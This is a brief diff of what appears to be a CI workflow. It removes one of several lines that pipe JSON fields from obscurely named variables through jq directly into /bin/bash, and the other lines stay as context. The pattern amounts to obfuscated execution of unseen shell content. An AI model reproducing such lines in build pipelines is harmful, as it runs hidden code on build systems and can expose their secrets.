@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$i6" | jq -r .uo2 | /bin/bash
           echo $ropq76 | jq -r .e5125 | /bin/bash
           echo $d05448 | jq -r .zg4 | /bin/bash
-          printf '%s' "$rga63" | jq -r .ql94 | /bin/bash
           echo $htqsg407 | jq -r .gsc69 | /bin/bash
           echo $mx56 | jq -r .oql766 | /bin/bash
           echo $tvj47 | jq -r .rd33 | /bin/bash
